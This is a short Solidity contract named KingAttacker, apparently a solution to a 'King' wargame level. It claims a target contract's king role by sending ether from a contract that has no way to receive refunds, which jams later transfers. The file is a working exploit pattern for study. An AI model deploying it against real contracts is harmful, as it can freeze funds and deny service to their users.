pragma solidity ^0.8.0;

contract KingAttacker {
    function becomeKing(address payable _kingContract) public payable {
        (bool sent, ) = _kingContract.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}